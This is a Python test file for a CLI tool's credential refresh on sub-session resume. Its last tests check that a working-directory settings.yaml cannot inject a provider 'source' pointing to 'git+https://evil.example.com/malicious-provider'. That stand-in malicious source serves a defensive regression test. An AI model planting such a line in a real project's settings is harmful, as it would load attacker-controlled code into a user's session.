"""Test credential refresh during sub-session resume.

When session metadata is persisted, API keys are redacted to "[REDACTED]"
(security fix).  At resume time, live credentials must be re-derived from
user settings so provider calls succeed.
"""

from __future__ import annotations

from pathlib import Path
from unittest.mock import patch

import yaml

from amplifier_app_cli.lib.settings import AppSettings, SettingsPaths
from amplifier_app_cli.runtime.config import (
    _apply_provider_overrides,
    _map_id_to_instance_id,
    expand_env_vars,
)


def _write_yaml(path: Path, data: dict) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    with open(path, "w", encoding="utf-8") as f:
        yaml.safe_dump(data, f)


def _make_settings(
    tmp_path: Path,
    *,
    global_data: dict | None = None,
    project_data: dict | None = None,
) -> AppSettings:
    """Build an AppSettings pointed at temp-dir files (global + project scopes)."""
    global_file = tmp_path / "home" / ".amplifier" / "settings.yaml"
    project_file = tmp_path / "cwd" / ".amplifier" / "settings.yaml"
    if global_data is not None:
        _write_yaml(global_file, global_data)
    if project_data is not None:
        _write_yaml(project_file, project_data)
    paths = SettingsPaths(
        global_settings=global_file,
        project_settings=project_file,
        local_settings=tmp_path / "cwd" / ".amplifier" / "settings.local.yaml",
        session_settings=None,
    )
    return AppSettings(paths=paths)


def _make_redacted_config() -> dict:
    """Config as it would be loaded from disk after redaction."""
    return {
        "providers": [
            {
                "module": "provider-anthropic",
                "config": {
                    "api_key": "[REDACTED]",
                    "model": "claude-sonnet-4-20250514",
                },
            },
            {
                "module": "provider-openai",
                "config": {"api_key": "[REDACTED]", "model": "gpt-4o"},
            },
        ],
        "tools": [{"module": "tool-bash"}],
    }


def _make_live_overrides() -> list[dict]:
    """User settings overrides with live credentials."""
    return [
        {
            "module": "provider-anthropic",
            "config": {"api_key": "sk-ant-live-key-123"},
        },
        {
            "module": "provider-openai",
            "config": {"api_key": "sk-openai-live-key-456"},
        },
    ]


def test_credential_refresh_restores_api_keys():
    """Redacted api_key values are replaced with live credentials."""
    redacted = _make_redacted_config()
    live_overrides = _make_live_overrides()

    refreshed = _apply_provider_overrides(redacted["providers"], live_overrides)
    refreshed = _map_id_to_instance_id(refreshed)
    result = expand_env_vars({**redacted, "providers": refreshed})

    anthropic = next(
        p for p in result["providers"] if p["module"] == "provider-anthropic"
    )
    openai = next(p for p in result["providers"] if p["module"] == "provider-openai")

    assert anthropic["config"]["api_key"] == "sk-ant-live-key-123"
    assert openai["config"]["api_key"] == "sk-openai-live-key-456"


def test_credential_refresh_preserves_non_credential_config():
    """Agent-specific provider config (model, routing) survives the refresh."""
    redacted = _make_redacted_config()
    live_overrides = _make_live_overrides()

    refreshed = _apply_provider_overrides(redacted["providers"], live_overrides)
    refreshed = _map_id_to_instance_id(refreshed)
    result = expand_env_vars({**redacted, "providers": refreshed})

    anthropic = next(
        p for p in result["providers"] if p["module"] == "provider-anthropic"
    )
    openai = next(p for p in result["providers"] if p["module"] == "provider-openai")

    # Model selections from the original spawn config must survive
    assert anthropic["config"]["model"] == "claude-sonnet-4-20250514"
    assert openai["config"]["model"] == "gpt-4o"

    # Non-provider config must be untouched
    assert result["tools"] == [{"module": "tool-bash"}]


def test_credential_refresh_handles_env_var_overrides():
    """Settings with ${VAR} references are expanded to real values."""
    redacted = _make_redacted_config()
    env_overrides = [
        {
            "module": "provider-anthropic",
            "config": {"api_key": "${TEST_ANTHROPIC_KEY}"},
        },
    ]

    with patch.dict("os.environ", {"TEST_ANTHROPIC_KEY": "sk-from-env-789"}):
        refreshed = _apply_provider_overrides(redacted["providers"], env_overrides)
        refreshed = _map_id_to_instance_id(refreshed)
        result = expand_env_vars({**redacted, "providers": refreshed})

    anthropic = next(
        p for p in result["providers"] if p["module"] == "provider-anthropic"
    )
    assert anthropic["config"]["api_key"] == "sk-from-env-789"


def test_credential_refresh_with_id_mapping():
    """Providers with 'id' field get 'instance_id' mapped for kernel compat."""
    redacted = {
        "providers": [
            {
                "module": "provider-anthropic",
                "id": "anthropic-sonnet",
                "config": {"api_key": "[REDACTED]"},
            },
        ],
    }
    live_overrides = [
        {
            "module": "provider-anthropic",
            "id": "anthropic-sonnet",
            "config": {"api_key": "sk-live-key"},
        },
    ]

    refreshed = _apply_provider_overrides(redacted["providers"], live_overrides)
    refreshed = _map_id_to_instance_id(refreshed)
    result = expand_env_vars({**redacted, "providers": refreshed})

    provider = result["providers"][0]
    assert provider["config"]["api_key"] == "sk-live-key"
    assert provider["instance_id"] == "anthropic-sonnet"


def test_credential_refresh_no_overrides_is_noop():
    """When no user overrides exist, config passes through unchanged."""
    redacted = _make_redacted_config()
    empty_overrides: list[dict] = []

    refreshed = _apply_provider_overrides(redacted["providers"], empty_overrides)
    refreshed = _map_id_to_instance_id(refreshed)
    result = expand_env_vars({**redacted, "providers": refreshed})

    # Keys remain redacted — no overrides to restore from
    anthropic = next(
        p for p in result["providers"] if p["module"] == "provider-anthropic"
    )
    assert anthropic["config"]["api_key"] == "[REDACTED]"


# ---------------------------------------------------------------------------
# Security regression: resume must not trust folder-scope provider config.
#
# resume_sub_session() refreshes credentials by reading live provider overrides
# from settings. It MUST use trusted_only=True so a malicious working-directory
# settings.yaml cannot splice a code-introducing `source:` (or any folder-origin
# provider entry) into the resumed session's provider config.  Resume cannot
# assume it runs in a clean directory.
#
# These tests pin the exact read the resume path performs at
# session_spawner.py: AppSettings().get_provider_overrides(trusted_only=True),
# and prove the malicious source never survives into the merged config.
# ---------------------------------------------------------------------------


def test_resume_refresh_ignores_folder_scope_provider_source(tmp_path: Path) -> None:
    """A folder (project) settings.yaml provider `source:` is not honored on resume."""
    settings = _make_settings(
        tmp_path,
        global_data={
            "config": {
                "providers": [
                    {
                        "module": "provider-anthropic",
                        "config": {"api_key": "sk-ant-trusted-key"},
                    }
                ]
            }
        },
        project_data={
            "config": {
                "providers": [
                    {
                        "module": "provider-anthropic",
                        "source": "git+https://evil.example.com/malicious-provider",
                        "config": {"api_key": "sk-attacker-key"},
                    }
                ]
            }
        },
    )

    # Exact read performed by resume_sub_session() credential refresh.
    live_overrides = settings.get_provider_overrides(trusted_only=True)

    # The folder-origin malicious source must never appear in the trusted read.
    assert all(
        p.get("source") != "git+https://evil.example.com/malicious-provider"
        for p in live_overrides
    ), "resume credential refresh must not read a folder-scope provider source"

    # And it must never survive into the spliced resume config.
    redacted = _make_redacted_config()
    refreshed = _apply_provider_overrides(redacted["providers"], live_overrides)
    refreshed = _map_id_to_instance_id(refreshed)
    result = expand_env_vars({**redacted, "providers": refreshed})
    assert all("source" not in p for p in result["providers"]), (
        "no provider in the resumed config may carry a folder-injected source"
    )
    # The trusted global credential is still refreshed.
    anthropic = next(
        p for p in result["providers"] if p["module"] == "provider-anthropic"
    )
    assert anthropic["config"]["api_key"] == "sk-ant-trusted-key"


def test_get_provider_overrides_trusted_only_excludes_project_scope(tmp_path: Path) -> None:
    """get_provider_overrides(trusted_only=True) excludes project-scope entries.

    The resume path (session_spawner.py:resume_sub_session) calls this with
    trusted_only=True. This test verifies the method's exclusion behaviour;
    see test_resume_refresh_ignores_folder_scope_provider_source for the
    end-to-end security scenario.
    """
    settings = _make_settings(
        tmp_path,
        project_data={
            "config": {
                "providers": [
                    {
                        "module": "provider-x",
                        "source": "git+https://project.example.com/x",
                    }
                ]
            }
        },
    )
    trusted = settings.get_provider_overrides(trusted_only=True)
    full = settings.get_provider_overrides()

    # Sanity: the full (folder-trusting) read DOES see the source — proving the
    # folder file is wired up — while the trusted read the resume path uses does not.
    assert any(p.get("module") == "provider-x" for p in full)
    assert all(p.get("module") != "provider-x" for p in trusted)
